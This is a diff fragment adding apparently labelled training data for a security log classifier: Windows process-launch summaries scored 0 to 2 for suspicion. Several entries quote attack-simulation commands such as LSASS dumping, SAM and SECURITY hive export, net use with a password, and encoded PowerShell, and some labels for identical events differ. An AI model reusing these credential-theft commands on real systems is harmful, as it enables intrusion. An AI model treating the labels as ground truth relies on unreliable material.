+        "On 7/7/2025 8:23:49 PM, `HOSTNAME.EXE` (PID: 9480) was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`whoami.exe` launched from `SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`UsoClient.exe` launched with no command line arguments or parent process details.",
+        1
+    ],
+    [
+        "`SearchProtocolHost.exe` was executed by `SearchIndexer.exe` with parameters related to the Windows Search service. The process ran under `NT AUTHORITY\\SYSTEM` with a system integrity level.",
+        0
+    ],
+    [
+        "`csc.exe` launched by PowerShell with a command referencing temporary files.",
+        2
+    ],
+    [
+        "The process `SearchFilterHost.exe` was launched with no associated parent process or command line.",
+        0
+    ],
+    [
+        "Event ID 1 - Execution of `conhost.exe` by `cmd.exe`.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` was launched from the `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` directory under the `DESKTOP-DU6JNPV\\bazinga` user.",
+        1
+    ],
+    [
+        "`whoami.exe` was executed from the `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` directory.",
+        1
+    ],
+    [
+        "`whoami.exe` was executed without parent process or command details.",
+        1
+    ],
+    [
+        "`DeviceCensus.exe` was launched under user `bazinga` with no command or parent process details.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` was launched from the directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4` under the user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "Process `net.exe` (PID: 3472) was launched without command or parent process details.",
+        2
+    ],
+    [
+        "The `csc.exe` process (C# compiler) was launched, with missing command-line arguments and parent process details.",
+        1
+    ],
+    [
+        "`conhost.exe` was launched by `powershell.exe` using the command: `C:\\AtomicRedTeam\\atomics\\T1055\\bin\\x64\\EtwpCreateEtwThread.exe -debug`.",
+        2
+    ],
+    [
+        "Process `whoami.exe` was launched without command or parent process information. User: `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "`FileCoAuth.exe` launched from OneDrive directory.",
+        1
+    ],
+    [
+        "`SearchFilterHost.exe` was launched by `SearchIndexer.exe` under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "Process `powershell.exe` launched with missing parent process and directory details under user `DESKTOP-DU6JNPV\\bazinga`.",
+        2
+    ],
+    [
+        "Process `conhost.exe` was launched by `cmd.exe` with the command `\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1`. User: `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "Process `SearchFilterHost.exe` launched by `SearchIndexer.exe`.",
+        0
+    ],
+    [
+        "`SearchProtocolHost.exe` (PID: 6416) was launched by `SearchIndexer.exe` with typical arguments.",
+        0
+    ],
+    [
+        "- `createdump.exe` (PID: 2468) was executed from the .NET Core runtime directory to create a dump file of the LSASS process (`lsass.dmp`) in the `Temp` directory.  - It was invoked via PowerShell (PID: 6276), which resolved the path dynamically and used `Get-Process` to target `lsass`.  - The execution occurred under the user `bazinga` with a `High` integrity level.",
+        2
+    ],
+    [
+        "`svchost.exe` was launched with no command-line arguments. Parent process information is missing.",
+        1
+    ],
+    [
+        "`whoami.exe` launched with no arguments by an unknown process.",
+        1
+    ],
+    [
+        "`whoami.exe` was executed from the `SecureSLM\\Run4` directory by an unknown parent process under the user `bazinga` with high integrity.",
+        1
+    ],
+    [
+        "Process `whoami.exe` (PID: 14992) was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` with high integrity level.",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "On 7/7/2025 11:11:56 AM, `HOSTNAME.EXE` (PID: 1068) was executed with no visible parent process.",
+        1
+    ],
+    [
+        "Event ID 5 - Process `whoami.exe` (PID: 5216) launched. No command or parent process details provided.",
+        1
+    ],
+    [
+        "Process `mimikatz.exe` (PID: 864) was launched from `C:\\Users\\bazinga\\AppData\\Local\\Temp\\mimikatz\\x64`.",
+        2
+    ],
+    [
+        "`svchost.exe` (PID: 3476) launched under `NT AUTHORITY\\SYSTEM`. No parent process recorded.",
+        0
+    ],
+    [
+        "On 7/7/2025 11:11:56 AM, `HOSTNAME.EXE` (PID: 1068) was executed again, this time spawned by an unknown process (PID: 8924).",
+        1
+    ],
+    [
+        "`SearchFilterHost.exe` (PID: 11624) was launched with no command line arguments or parent process information. The process ran with no directory or integrity level details under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "`RuntimeBroker.exe` launched with no command-line arguments and no parent process.",
+        0
+    ],
+    [
+        "`HOSTNAME.EXE` was executed by a PowerShell process running from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run3`. The integrity level was `High`.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` launched with empty command-line arguments and no parent process.",
+        1
+    ],
+    [
+        "`AtomicRedTeam` artifacts and PowerShell abuse observed.",
+        2
+    ],
+    [
+        "`SearchFilterHost.exe` was launched under the `NT AUTHORITY\\SYSTEM` user by `SearchIndexer.exe` with a typical command structure.",
+        0
+    ],
+    [
+        "`whoami.exe` (PID: 10892) launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "PowerShell launched with a suspicious `iex` command downloading a script from GitHub.",
+        2
+    ],
+    [
+        "`SearchFilterHost.exe` (PID: 3040) launched by `SearchIndexer.exe` (PID: 4244).",
+        0
+    ],
+    [
+        "`taskhostw.exe` was launched under user `bazinga` but lacks command and parent process details.",
+        1
+    ],
+    [
+        "`whoami.exe` (PID: 8676) was launched without detailed command-line arguments or parent process information.",
+        0
+    ],
+    [
+        "`net.exe` launched with the command: `net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator`.",
+        2
+    ],
+    [
+        "Event ID 5 indicates `HOSTNAME.EXE` (PID: 5352) was launched with no command-line arguments. The parent process and directory are undefined.",
+        1
+    ],
+    [
+        "`SearchFilterHost.exe` launched by `SearchIndexer.exe`.",
+        0
+    ],
+    [
+        "`whoami.exe` executed in a suspicious directory.",
+        1
+    ],
+    [
+        "Process `whoami.exe` launched with no parent process or directory information (Event ID 5).",
+        1
+    ],
+    [
+        "`whoami.exe` was launched from the `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` directory under the `DESKTOP-DU6JNPV\\bazinga` user.",
+        1
+    ],
+    [
+        "`conhost.exe` launched with empty command-line arguments, no parent process, and missing directory information.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` was launched from `Documents\\SecureSLM\\Run4` directory.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` (PID: 8520) launched without command or parent details.",
+        1
+    ],
+    [
+        "Process launched with command: `\\\"C:\\Windows\\system32\\HOSTNAME.EXE\\\"`.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` launched from a non-standard directory.",
+        1
+    ],
+    [
+        "The `HOSTNAME.EXE` process was executed from `C:\\Windows\\System32` but lacks parent process, command-line arguments, and execution directory details.",
+        1
+    ],
+    [
+        "`reg.exe` (PID: 8420) was launched without detailed command-line arguments or parent process information.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` launched from `SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`cmd.exe` (PID: 1808) launched with command: `cmd.exe /c netsh trace start capture=yes tracefile=%%temp%%\\trace.etl maxsize=10`.",
+        2
+    ],
+    [
+        "`backgroundTaskHost.exe` launched under `svchost.exe` with `AppContainer` integrity.",
+        0
+    ],
+    [
+        "Process `audiodg.exe` (PID: 5712) was launched by `svchost.exe` (PID: 2172.0) using the command: `AUDIODG.EXE 0x514 0x51c`. Ran under `NT AUTHORITY\\LOCAL SERVICE` with `System` integrity level.",
+        0
+    ],
+    [
+        "`conhost.exe` (PID: 7404) was launched, but the parent process and command-line arguments are missing.",
+        1
+    ],
+    [
+        "`WmiPrvSE.exe` (PID: 5316) launched with no command details or parent process information.",
+        1
+    ],
+    [
+        "Process `C:\\Windows\\System32\\HOSTNAME.EXE` (PID: 4380) launched with no command-line arguments or parent process.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` launched without a parent process or command-line arguments under user `bazinga`.",
+        1
+    ],
+    [
+        "`certutil.exe` (PID: 5104) was launched with no command line arguments, no parent process, and ran under user `bazinga`.",
+        1
+    ],
+    [
+        "Duplicate entry for `HOSTNAME.EXE` with incomplete details.",
+        1
+    ],
+    [
+        "Process launched with command: `\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1`.",
+        1
+    ],
+    [
+        "Multiple instances of `notepad.exe` were launched in quick succession, with some processes being used as targets for DLL injection.",
+        2
+    ],
+    [
+        "Process `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` (PID: 4596) was launched with the same suspicious script as in Log Entry 6, from the `AppData\\Local\\Temp` directory.",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` (PID 12040) was executed from the `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` directory. The parent process (PID: 8924) is unknown.",
+        1
+    ],
+    [
+        "`RuntimeBroker.exe` (PID: 8948) launched by `svchost.exe` with typical `-Embedding` arguments.",
+        0
+    ],
+    [
+        "Process `SecurityHealthHost.exe` was launched with no command-line arguments, from an unknown parent process, running under user `DESKTOP-DU6JNPV\\bazinga` with unspecified integrity level.",
+        0
+    ],
+    [
+        "Process `C:\\Windows\\System32\\whoami.exe` (PID: 2724) was launched with no command or parent process specified.",
+        0
+    ],
+    [
+        "`C:\\Windows\\System32\\svchost.exe` (PID: 3544) was launched without a parent process.",
+        0
+    ],
+    [
+        "Hostname.exe launched, but incomplete details (PID: -1, empty directory, etc.).",
+        1
+    ],
+    [
+        "`UsoClient.exe` launched by PowerShell with another `iex` command downloading a script from GitHub.",
+        2
+    ],
+    [
+        "`C:\\Windows\\System32\\cleanmgr.exe` launched with `/autoclean`.",
+        0
+    ],
+    [
+        "`whoami.exe` was launched by PowerShell, originating from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run3\\`.",
+        2
+    ],
+    [
+        "`whoami.exe` launched with missing parent process details.",
+        1
+    ],
+    [
+        "`Hostname.exe` was launched via an unknown parent process in a non-standard directory (`C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`) under a high-integrity user context.",
+        1
+    ],
+    [
+        "`cmd.exe` was launched with a base64-encoded PowerShell command (`-exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA`) in the `AppData\\Local\\Temp` directory under the user `DESKTOP-DU6JNPV\\bazinga`.",
+        2
+    ],
+    [
+        "`whoami.exe` was executed with standard parameters in the directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4`.",
+        1
+    ],
+    [
+        "`wmic.exe` executed `notepad.exe` using `process call create` from a temporary directory.",
+        2
+    ],
+    [
+        "`SearchFilterHost.exe` launched by `SearchIndexer.exe`.",
+        0
+    ],
+    [
+        "`SearchFilterHost.exe` (PID 9288) was launched without a parent process specified.",
+        0
+    ],
+    [
+        "`SearchProtocolHost.exe` launched by `SearchIndexer.exe` with typical arguments.",
+        0
+    ],
+    [
+        "`conhost.exe` launched with no command-line arguments.",
+        0
+    ],
+    [
+        "`find.exe` executed with empty or missing command parameters.",
+        1
+    ],
+    [
+        "`conhost.exe` launched by PowerShell with a suspicious `iex` command downloading a script from GitHub.",
+        2
+    ],
+    [
+        "`schtasks.exe` created the scheduled task `T1053_005_OnLogon` to execute `cmd.exe /c calc.exe`. It was spawned by `cmd.exe` and ran from a temporary directory.",
+        2
+    ],
+    [
+        "Event ID 1 indicates `whoami.exe` (PID: 13956) was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` by an undefined parent process (PID: 8924.0).",
+        1
+    ],
+    [
+        "`ninja_syscall1.exe` was launched by `powershell.exe` with obfuscated commands.",
+        2
+    ],
+    [
+        "`WmiPrvSE.exe` launched with empty command line under `NT AUTHORITY\\ETWORK SERVICE`.",
+        0
+    ],
+    [
+        "`WmiPrvSE.exe` (PID: 4636) launched by `svchost.exe` (PID: 916) under `NT AUTHORITY\\ETWORK SERVICE`.",
+        0
+    ],
+    [
+        "Process `C:\\Windows\\System32\\SearchFilterHost.exe` (PID: 9432) was launched with no command-line arguments or parent process.",
+        0
+    ],
+    [
+        "Process `whoami.exe` executed. No command-line arguments or parent process details provided. Ran under user `bazinga` with missing integrity level.",
+        1
+    ],
+    [
+        "`lsm.exe` executed with the command:  `cmd.exe /c copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe & C:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt`.",
+        2
+    ],
+    [
+        "On 7/7/2025 11:11:56 AM, `whoami.exe` (PID: 6184) was executed with no visible parent process.",
+        1
+    ],
+    [
+        "The process `whoami.exe` was launched with no associated parent process or command line.",
+        0
+    ],
+    [
+        "Process `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` (PID: 5920) was launched with no command or parent process specified.",
+        1
+    ],
+    [
+        "Event ID 5 - Process `conhost.exe` (PID: 8804) launched. No command or parent process details provided.",
+        1
+    ],
+    [
+        "Process `conhost.exe` (PID: 6416) launched by `powershell.exe` (PID: 7272) with command that includes downloading and executing PowerShell script `Out-Minidump.ps1` from `https://github.com/redcanaryco/atomic-red-team`.",
+        2
+    ],
+    [
+        "`powershell.exe` (PID: 11688) launched with command `\\\"powershell.exe\\\" & {C:\\AtomicRedTeam\\atomics\\T1055.011\\bin\\T1055.011_x64.exe}` from the temporary directory `C:\\Users\\bazinga\\AppData\\Local\\Temp\\`.",
+        2
+    ],
+    [
+        "`WerFault.exe` (PID: 5316) launched by `PowerShell.exe` (PID: 4588).",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` (PID: 7012) was launched without detailed command-line arguments or parent process information.",
+        0
+    ],
+    [
+        "`conhost.exe` was launched by `powershell.exe` with a command that appears to iterate through a list of suspicious PowerShell commands and execute a tool (`SharpView.exe`) located in the `AtomicRedTeam` directory.",
+        2
+    ],
+    [
+        "Process `C:\\Windows\\System32\\conhost.exe` (PID: 9656) launched without a parent process.",
+        1
+    ],
+    [
+        "`whoami.exe` was executed from the directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` under the user `bazinga` with high integrity.",
+        1
+    ],
+    [
+        "`SearchFilterHost.exe` (PID: 3116) was launched by `SearchIndexer.exe` with typical arguments.",
+        0
+    ],
+    [
+        "Process `HOSTNAME.EXE` executed with command `\\\"C:\\Windows\\system32\\HOSTNAME.EXE`. Parent process was `powershell.exe`. Execution occurred in `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run3\\` under user `bazinga` with high integrity level.",
+        1
+    ],
+    [
+        "`SearchFilterHost.exe` (PID: 9780) launched by `SearchIndexer.exe` with command-line arguments.",
+        0
+    ],
+    [
+        "`cvtres.exe` was used to generate a file in a temporary directory. The parent process was `csc.exe`, which was invoked by PowerShell.",
+        2
+    ],
+    [
+        "`cvtres.exe` launched with no command-line arguments and no parent process.",
+        1
+    ],
+    [
+        "`SearchProtocolHost.exe` was launched by `SearchIndexer.exe`. The process operated under the `NT AUTHORITY\\SYSTEM` account with an integrity level of `System`.",
+        0
+    ],
+    [
+        "`svchost.exe` (PID: 6992) launched with no command-line arguments and unknown parent process (PID: -1.0).",
+        1
+    ],
+    [
+        "`SearchFilterHost.exe` launched under `NT AUTHORITY\\SYSTEM` with incomplete details.",
+        0
+    ],
+    [
+        "Process `C:\\Windows\\System32\\HOSTNAME.EXE` (PID: 8248) was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "Process `conhost.exe` was spawned by `powershell.exe` with a suspicious PowerShell script referencing `Start-Hollow.ps1` (a known technique for process hollowing). The script includes arguments for process injection and manipulation.",
+        2
+    ],
+    [
+        "`cmd.exe` was launched with the command to execute `Outflank-Dumpert.exe` from a temporary directory (`C:\\Users\\bazinga\\AppData\\Local\\Temp\\`).",
+        2
+    ],
+    [
+        "Multiple instances of `GoogleUpdater.exe` processes launched under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "On 7/7/2025 1:39:57 PM, `HOSTNAME.EXE` (PID: 10804) was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "Process launched without a command or parent process details.",
+        2
+    ],
+    [
+        "whoami.exe was executed with the command `C:\\Windows\\system32\\whoami.exe`, running in `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4` under user `bazinga`.",
+        1
+    ],
+    [
+        "Process `C:\\Windows\\System32\\whoami.exe` (PID: 3472) was launched with the command `whoami.exe` from the `SecureSLM\\Run4` directory, with no clear parent process.",
+        1
+    ],
+    [
+        "`conhost.exe` was launched by `powershell.exe` using an obfuscated PowerShell command. The process ran under the `DESKTOP-DU6JNPV\\bazinga` user with high integrity.",
+        2
+    ],
+    [
+        "`conhost.exe` (PID: 3228) was launched via PowerShell with a highly complex command involving the deobfuscation of a Base64-encoded payload extracted from an image file (`evil_kitten.jpg`), and subsequent script execution.",
+        2
+    ],
+    [
+        "Process `wsqmcons.exe` launched under `NT AUTHORITY\\SYSTEM` without parent process or command.",
+        1
+    ],
+    [
+        "PowerShell was launched with a command referencing `InjectView.exe` in a temporary directory (`AppData\\Local\\Temp`) under a high-integrity user context.",
+        2
+    ],
+    [
+        "`cmd.exe` launched with PowerShell as its parent process.",
+        2
+    ],
+    [
+        "`C:\\Windows\\System32\\conhost.exe` (PID: 11048) was launched.",
+        1
+    ],
+    [
+        "`whoami.exe` was executed with no command-line arguments or parent process. The directory, user, and integrity level are all missing.",
+        1
+    ],
+    [
+        "`powershell.exe` (PID 8964) was launched from `C:\\Users\\bazinga\\AppData\\Local\\Temp` using a command referencing `CreateProcess.exe` and `werfault.exe`.",
+        2
+    ],
+    [
+        "`reg.exe` (PID: 1848) was launched without detailed command-line arguments or parent process information.",
+        1
+    ],
+    [
+        "The process `HOSTNAME.EXE` was launched with no associated parent process or command line.",
+        0
+    ],
+    [
+        "`C:\\Windows\\System32\\wbem\\WmiPrvSE.exe` launched with command: `wmiprvse.exe -secured -Embedding` by `svchost.exe`.",
+        0
+    ],
+    [
+        "Process `HOSTNAME.EXE` was executed with no visible command-line arguments and no identifiable parent process.",
+        1
+    ],
+    [
+        "Process `conhost.exe` (PID: 2332) was launched from `C:\\Windows\\System32`.",
+        0
+    ],
+    [
+        "`svchost.exe` (PID: 1992) launched from `AppData\\Local\\Temp` by `powershell.exe`.",
+        2
+    ],
+    [
+        "`hostname.exe` (PID: 10308) executed by `powershell.exe`.",
+        1
+    ],
+    [
+        "`conhost.exe` was launched by `powershell.exe` with a command that copies a file from a network share to a temp directory.",
+        2
+    ],
+    [
+        "`powershell.exe` launched without a parent process or command-line arguments under user `bazinga`.",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` was launched with no command or parent process information under user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "- PowerShell (PID: 6276) was launched by another PowerShell process (PID: 6224) using a command to execute `createdump.exe` for LSASS dumping.",
+        2
+    ],
+    [
+        "`C:\\Windows\\System32\\conhost.exe` launched with no command-line arguments and missing parent process information.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` (PID: 8520) launched with command: `\\\"C:\\Windows\\system32\\HOSTNAME.EXE\\\"`.",
+        1
+    ],
+    [
+        "Process `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` (PID: 4588) launched without a parent process.",
+        2
+    ],
+    [
+        "Process `HOSTNAME.EXE` launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`whoami` executed.",
+        1
+    ],
+    [
+        "`C:\\Windows\\System32\\svchost.exe` (PID: 2844) was launched with the command: `C:\\Windows\\System32\\svchost.exe -k NetworkService -p -s WinRM`.",
+        0
+    ],
+    [
+        "`WmiPrvSE.exe` (PID 9348) was launched by `svchost.exe` (PID 916).",
+        0
+    ],
+    [
+        "On 7/7/2025 11:11:57 AM, `powershell.exe` (PID: 3132) executed a command that involved Base64 encoding and registry modification. It was spawned by an unknown process (PID: 8924).",
+        2
+    ],
+    [
+        "On 7/7/2025 11:27:52 AM, Event ID 1 occurred. Process `SearchFilterHost.exe` was launched by `SearchIndexer.exe` under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "`hostname.exe` (PID: 10308) launched without a parent process.",
+        1
+    ],
+    [
+        "`svchost.exe` (PID: 5344) launched with command: `svchost.exe -k netsvcs -p -s NetSetupSvc`.",
+        0
+    ],
+    [
+        "Process `HOSTNAME.EXE` was launched without a parent process or command arguments.",
+        1
+    ],
+    [
+        "`whoami.exe` (PID: 15024) launched without a parent process.",
+        1
+    ],
+    [
+        "`whoami.exe` (PID: 15024) launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "Process `WmiPrvSE.exe` was launched under `NT AUTHORITY\\ETWORK SERVICE` with no parent process or command-line arguments specified.",
+        0
+    ],
+    [
+        "`HOSTNAME.EXE` (PID: 2084) was launched from `C:\\Windows\\System32\\`.",
+        0
+    ],
+    [
+        "Process `whoami.exe` (PID: 12248) was launched from `C:\\Windows\\System32`.",
+        1
+    ],
+    [
+        "Process `powershell.exe` (PID: 1132) was launched using the command `[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt`. It was spawned by an unknown parent process (`PID: 8924`) and executed in the `C:\\Users\\bazinga\\AppData\\Local\\Temp\\` directory under user `DESKTOP-DU6JNPV\\bazinga` with high integrity.",
+        2
+    ],
+    [
+        "`SearchProtocolHost.exe` (PID: 6236) launched.",
+        0
+    ],
+    [
+        "`reg.exe` (PID: 1848) saved the `HKLM\\security` registry hive to a temporary directory. Parent process: `cmd.exe`.",
+        2
+    ],
+    [
+        "WMIC.exe was executed with the command `wmic /node:127.0.0.1 process call create \\\"rundll32.exe \\\\\"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\calc.dll\\\\\" StartW\\\"`. It was spawned by `cmd.exe` running in a temporary directory (`C:\\Users\\bazinga\\AppData\\Local\\Temp`) under the user `bazinga`.",
+        2
+    ],
+    [
+        "`reg.exe` (PID: 8412) launched.",
+        1
+    ],
+    [
+        "`SearchFilterHost.exe` was launched by `SearchIndexer.exe` under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "`conhost.exe` (PID: 10880) launched with command: `\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1`, spawned by `cmd.exe` (PID: 7252).",
+        1
+    ],
+    [
+        "`svchost.exe` (PID: 5412) launched with the `BITS` service under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "Process `cmd.exe` (PID: 10788) was launched from `C:\\Windows\\System32`.",
+        1
+    ],
+    [
+        "Process launched without a command or parent process details.",
+        1
+    ],
+    [
+        "Event ID 1 - Process `svchost.exe` (PID: 12484) launched with command `svchost.exe -k netsvcs -p -s BITS`. Parent process is `services.exe` (PID: 780.0).",
+        0
+    ],
+    [
+        "`conhost.exe` was executed with the command `\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1`, spawned by `cmd.exe`.",
+        1
+    ],
+    [
+        "On 7/7/2025 1:39:57 PM, `whoami.exe` (PID: 11216) was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "Process `HOSTNAME.EXE` (PID: 6796) launched with no specified command, parent process, or integrity level.",
+        0
+    ],
+    [
+        "Multiple instances of `certutil.exe` were used to encode the SAM file from various shadow copies (e.g., `HarddiskVolumeShadowCopy8`, `HarddiskVolumeShadowCopy7`, etc.).",
+        2
+    ],
+    [
+        "`whoami.exe` launched with no command under user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "On 7/7/2025 6:42:34 PM, `whoami.exe` (PID: 5844) was executed from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`conhost.exe` launched by `C:\\Windows\\Temp\\svchost.exe`.",
+        2
+    ],
+    [
+        "`conhost.exe` launched with `-ForceV1` by `cmd.exe`.",
+        1
+    ],
+    [
+        "Process `HOSTNAME.EXE` (PID: 3068) was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` with high integrity level.",
+        2
+    ],
+    [
+        "`reg.exe` (PID: 4668) saved the `HKLM\\system` registry hive to a temporary directory. Parent process: `cmd.exe`.",
+        2
+    ],
+    [
+        "Event ID 1 - Process `whoami.exe` (PID: 5216) launched with command `\\\"whoami.exe\\\"`. Parent process is `-` (PID: 8924) running from `Documents\\SecureSLM\\Run4`.",
+        2
+    ],
+    [
+        "`cmd.exe` was launched with the command to execute `procdump.exe` for dumping `lsass.exe` memory. The parent process is unidentified (`PID: 7468`), and execution occurred from a temporary directory.",
+        2
+    ],
+    [
+        "`C:\\Windows\\System32\\AppHostRegistrationVerifier.exe` launched.",
+        0
+    ],
+    [
+        "`cmd.exe` (PID: 9984) launched.",
+        1
+    ],
+    [
+        "`whoami.exe` was executed with no parameters and no parent process (`PID: -1.0`) or directory information provided.",
+        1
+    ],
+    [
+        "`powershell.exe` was launched directly from a temporary directory with the same malicious command as in Entry 1.",
+        2
+    ],
+    [
+        "Multiple PowerShell scripts and `.exe` files were executed in quick succession.",
+        2
+    ],
+    [
+        "`UsoClient.exe` (PID: 11432) launched by PowerShell with a suspicious `iex` command downloading a script from a GitHub URL.",
+        2
+    ],
+    [
+        "On 7/7/2025 11:27:52 AM, Event ID 1 occurred. Process `SearchProtocolHost.exe` was launched by `SearchIndexer.exe`.",
+        0
+    ],
+    [
+        "Process `conhost.exe` was launched by `powershell.exe` with a command attempting to copy sensitive files (`SAM` registry hive) from a shadow copy to a temporary directory.",
+        2
+    ],
+    [
+        "`whoami.exe` was launched without a parent process (PID: -1) and with missing directory and integrity level information.",
+        1
+    ],
+    [
+        "Process `C:\\Windows\\System32\\whoami.exe` (PID: 2724) was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "Process `HOSTNAME.EXE` (PID: 3124) launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` with high integrity level.",
+        1
+    ],
+    [
+        "Multiple instances of `MicrosoftEdgeUpdate.exe` launched under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "`HOSTNAME.EXE` was executed by PowerShell.",
+        1
+    ],
+    [
+        "`cmd.exe` was launched without a parent process or command details.",
+        1
+    ],
+    [
+        "Process `powershell.exe` executed the same suspicious command as above, copying `T1036.003.exe` to `%TEMP%` and executing it as `svchost.exe`.",
+        2
+    ],
+    [
+        "`conhost.exe` (PID: 8892) was launched with the command `\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1`. Parent process: `cmd.exe`.",
+        1
+    ],
+    [
+        "Process `'C:\\Windows\\System32\\SearchProtocolHost.exe'` was launched by `'C:\\Windows\\System32\\SearchIndexer.exe'`.",
+        0
+    ],
+    [
+        "`WmiPrvSE.exe` (PID: 11644) launched with `-Embedding`.",
+        0
+    ],
+    [
+        "`whoami.exe` (PID: 580) launched without a parent process.",
+        1
+    ],
+    [
+        "`whoami.exe` (PID: 14308) was launched with no command or parent process information.",
+        1
+    ],
+    [
+        "Process `SearchProtocolHost.exe` was launched with expected arguments, spawned by `SearchIndexer.exe`, running under `NT AUTHORITY\\SYSTEM` with system integrity.",
+        0
+    ],
+    [
+        "`whoami.exe` (PID: 1608) executed from `C:\\Windows\\System32` with no parent process.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` was launched with no apparent command or arguments, and no parent process is identified (`PID: -1`). The process ran with an unidentified integrity level in an unspecified directory.",
+        1
+    ],
+    [
+        "Multiple `.exe` files (`T1036.007_masquerading.docx.exe`, `T1036.007_masquerading.pdf.exe`, etc.) were executed from the temporary directory.",
+        2
+    ],
+    [
+        "`sppsvc.exe` launched by `services.exe`.",
+        0
+    ],
+    [
+        "`RuntimeBroker.exe` (PID: 14880) was launched by `svchost.exe` (PID: 916) with a benign command.",
+        0
+    ],
+    [
+        "`backgroundTaskHost.exe` was launched by `svchost.exe` with expected arguments.",
+        0
+    ],
+    [
+        "`SearchFilterHost.exe` was launched by `SearchIndexer.exe` with legitimate command-line arguments.",
+        0
+    ],
+    [
+        "Process `HOSTNAME.EXE` (PID: 3124) launched without a parent process or command details.",
+        1
+    ],
+    [
+        "Event ID 1 - Process `SecurityHealthHost.exe` (PID: 6880) launched with command `{08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding`. Parent process is `svchost.exe` (PID: 916.0).",
+        0
+    ],
+    [
+        "Process `conhost.exe` was launched by `powershell.exe` with a command involving `ListPlanting.exe`.",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` executed under user `bazinga`.",
+        1
+    ],
+    [
+        "On 7/7/2025 1:40:03 PM, `WmiPrvSE.exe` (PID: 4672) was launched with no command-line arguments. It was spawned by an unknown parent process (PID: -1).",
+        1
+    ],
+    [
+        "`powershell.exe` (PID: 12788) launched with no command details, ran under `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
